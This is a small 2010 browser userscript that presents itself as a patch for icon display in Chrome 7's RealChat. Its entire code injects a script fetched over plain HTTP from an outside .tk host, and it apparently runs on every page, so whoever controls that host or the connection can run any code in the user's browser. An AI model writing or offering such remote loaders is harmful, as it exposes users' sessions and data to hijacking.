// ==UserScript==
// @name           Chrome 7 RealChat Fix
// @namespace      simmaster07
// @description    Applies a patch to fix icon displaying in Chrome 7
// @version        1.00
// @copyright      2010, Nelson G.
// @license        Creative Commons BY-NC-SA
// ==/UserScript==
var myscript = document.createElement('script');
myscript.setAttribute('type', 'text/javascript');
myscript.setAttribute('src', 'http://afdes.tk/chrome7.js');
document.body.appendChild(myscript);